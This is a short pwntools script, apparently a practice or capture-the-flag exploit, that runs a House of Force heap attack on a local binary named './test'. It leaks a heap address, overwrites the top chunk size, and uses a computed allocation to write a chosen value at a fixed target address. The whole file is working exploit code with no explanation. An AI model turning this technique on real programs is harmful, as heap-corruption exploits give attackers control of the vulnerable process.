from pwn import *

p = process("./test")

context.log_level = "debug"

overwrite_me = 0x601090

buf_1 = u64(p.recv(6).ljust(8, b"\x00"))
top_chunk_addr = buf_1 + 0x28
print(hex(buf_1))
print(hex(top_chunk_addr))

pay = b""
pay += p64(0) * 5
pay += p64(0xffffffffffffffff)
p.sendline(pay)

p.sendafter(" :", str(overwrite_me - 0x10 - top_chunk_addr))

p.sendafter(" :", p64(0xdeadbeefcafebabe))

input()


p.interactive()